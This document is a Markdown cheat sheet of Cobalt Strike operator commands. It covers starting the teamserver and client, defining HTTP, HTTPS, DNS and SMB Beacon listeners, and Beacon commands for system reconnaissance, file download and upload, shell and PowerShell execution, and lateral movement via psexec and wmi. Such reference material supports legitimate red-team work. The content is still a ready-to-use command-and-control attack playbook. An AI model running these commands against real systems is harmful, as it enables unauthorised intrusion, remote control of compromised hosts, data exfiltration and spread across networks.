# Cobalt Strike

## setup

### Teamserver

Start a Cobalt Strike teamserver.

```sh title:"Start Cobalt Strike teamserver"
./teamserver "$external_ip" "$teamserver_pass"
```
<!-- cheat
var external_ip
var teamserver_pass
-->

### Client

Start the Cobalt Strike client.

```sh title:"Start Cobalt Strike client"
./cobaltstrike
```
<!-- cheat -->

## listeners

### HTTP listener

Aggressor listener block for HTTP Beacon.

```sh title:"Cobalt Strike Aggressor HTTP listener block"
listener http { set Host "$domain_or_ip"; set Port "$lport"; set BindPort "$lport"; }
```
<!-- cheat
var domain_or_ip
var lport
-->

### HTTPS listener

Aggressor listener block for HTTPS Beacon.

```sh title:"Cobalt Strike Aggressor HTTPS listener block"
listener https { set Host "$domain_or_ip"; set Port "$lport"; set BindPort "$lport"; set Cert "$certificate_path"; }
```
<!-- cheat
var domain_or_ip
var lport
var certificate_path
-->

### DNS listener

Aggressor listener block for DNS Beacon.

```sh title:"Cobalt Strike Aggressor DNS listener block"
listener dns { set Host "$domain"; set Port "$lport"; set BindPort "$lport"; }
```
<!-- cheat
var domain
var lport
-->

### SMB listener

Aggressor listener block for SMB Beacon.

```sh title:"Cobalt Strike Aggressor SMB listener block"
listener smb { set PipeName "$pipe_name"; }
```
<!-- cheat
var pipe_name
-->

## beacon

### Basic commands

Common Beacon job controls.

```sh title:"Cobalt Strike Common Beacon job controls"
help
sleep $seconds
jobs
jobkill $job_id
```
<!-- cheat
var seconds
var job_id
-->

### System info

Common Beacon situational awareness commands.

```sh title:"Cobalt Strike Common Beacon system info commands"
whoami
hostname
pwd
ps
netstat
```
<!-- cheat -->

### File operations

Common Beacon file operations.

```sh title:"Cobalt Strike Common Beacon file operations"
ls $path
cd $path
download $file
upload $file
```
<!-- cheat
var path
var file
-->

### Execute commands

Common Beacon execution commands.

```sh title:"Cobalt Strike Common Beacon execution commands"
shell $command
execute $command
powershell $command
```
<!-- cheat
var command
-->

### Lateral movement

Common Beacon lateral movement commands.

```sh title:"Cobalt Strike Common Beacon lateral movement commands"
psexec $target $command
wmi $target $command
smb $target $command
```
<!-- cheat
var target
var command
-->
